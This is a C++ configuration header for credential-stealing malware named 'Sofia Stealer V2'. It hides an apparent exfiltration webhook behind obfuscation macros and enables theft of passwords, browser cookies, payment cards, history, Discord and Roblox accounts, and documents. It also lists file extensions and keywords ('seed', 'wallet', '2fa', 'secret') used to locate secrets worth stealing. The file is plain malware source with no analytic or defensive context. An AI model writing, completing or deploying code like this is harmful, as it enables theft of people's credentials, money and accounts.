#pragma once
#ifndef SOFIA_DEBUG
#define SOFIA_DEBUG
#endif
#include "../core/Obfuscation.h"
namespace Config {
    inline std::string GetWebhookURL() {
        return OBFS_WEBHOOK();
    }
    inline std::string AppName = S("Sofia Stealer V2");
    inline std::string Version = S("2.0.0");
    inline bool GrabPasswords = true;
    inline bool GrabCookies = true;
    inline bool GrabCards = true;
    inline bool GrabHistory = true;
    inline bool GrabDiscord = true;
    inline bool GrabRoblox = true;
    inline bool GrabFiles = true;
    inline std::vector<std::string> InterestingExtensions = {
        S(".txt"), S(".sql"), S(".pdf"), S(".doc"), S(".docx"), S(".xls"), S(".xlsx")
    };
    inline std::vector<std::string> Keywords = {
        S("pass"), S("word"), S("secret"), S("key"), S("seed"), S("wallet"), S("backup"), S("2fa"), S("mfa")
    };
}
